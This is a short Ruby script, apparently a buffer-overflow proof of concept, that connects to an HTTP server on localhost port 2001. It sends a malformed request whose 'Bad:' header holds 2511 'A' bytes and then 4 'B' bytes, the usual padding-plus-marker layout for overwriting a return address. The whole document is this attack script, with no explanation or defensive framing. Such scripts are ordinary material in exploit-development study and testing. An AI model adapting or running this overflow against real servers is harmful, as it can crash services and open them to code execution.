#!/usr/bin/env ruby

     require "socket"

     host = "localhost"
     port = 2001

     s = TCPSocket.open(host, port)

     buf = "GET / HTTP/1.1\r\n"
     buf << "Host: " + "\r\n"
     buf << "localhost\r\n"
     buf << "Bad: "
     buf << "A" * 2511
     buf << "B" * 4

      s.puts(buf)
